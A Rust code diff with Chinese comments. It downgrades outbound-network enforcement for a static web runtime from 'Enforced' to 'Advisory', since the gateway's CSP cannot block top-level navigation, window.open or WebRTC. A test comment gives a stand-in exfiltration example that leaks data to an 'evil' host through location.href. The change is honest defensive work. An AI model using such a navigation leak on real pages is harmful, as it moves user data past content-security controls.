@@ -14,8 +14,9 @@ use crate::plan::EnforcementEntry;
 
 /// 这个 runtime 上每条权限的强制等级(**诚实**:做不到就标 `Advisory`/`Unsupported`)。
 ///
-/// - `static_web`:出站网络由 gateway 的 CSP 真正禁止(`Enforced`);静态页没有服务端数据目录
-///   (`Unsupported`);剪贴板/下载/弹窗取决于承载它的 WebView(产品层),gateway 管不到(`Advisory`)。
+/// - `static_web`:gateway 的 CSP 挡得住 fetch/XHR/子资源,**挡不住顶层导航、`window.open` 与 WebRTC**——所以出站网络
+///   现在只能标 `Advisory`;承载页面的 WebView(A4)落地"禁止离开本 origin 的导航"策略之后再升级成 `Enforced`。
+///   静态页没有服务端数据目录(`Unsupported`);剪贴板/下载/弹窗取决于 WebView(产品层),gateway 管不到(`Advisory`)。
 /// - `node`/`python`:macOS 上没有轻量进程沙箱,全部 `Advisory`——只是声明,不隔离。
 /// - `container`:挂载(`filesystem`)可由容器真正限制(`Enforced`);出站网络要额外的网络/代理配置,
 ///   一期不做(`Advisory`);其余同样取决于 WebView。
@@ -24,7 +25,7 @@ pub fn enforcement_for(runtime: &Runtime) -> Vec<EnforcementEntry> {
     use PermissionKey::*;
     let table: [(PermissionKey, Enforcement); 5] = match runtime {
         Runtime::StaticWeb { .. } => [
-            (NetworkOutbound, Enforced),
+            (NetworkOutbound, Advisory),
             (FilesystemData, Unsupported),
             (Clipboard, Advisory),
             (Downloads, Advisory),
@@ -106,13 +107,15 @@ mod tests {
     }
 
     #[test]
-    fn static_web_enforces_network_with_csp_and_is_honest_about_the_rest() {
+    fn static_web_is_advisory_on_network_until_the_webview_has_a_navigation_policy() {
         let e = enforcement_for(&Runtime::StaticWeb {
             source: "web/".into(),
         });
+        // CSP 挡住 fetch/XHR/子资源,但挡不住顶层导航(`location.href = 'https://evil/?d=…'`)、`window.open`
+        // 与 WebRTC;在 A4 的 WebView 导航策略(禁止离开本 origin)落地之前,不能把它标成 `Enforced`
         assert_eq!(
             level(&e, PermissionKey::NetworkOutbound),
-            Enforcement::Enforced
+            Enforcement::Advisory
         );
         assert_eq!(
             level(&e, PermissionKey::FilesystemData),
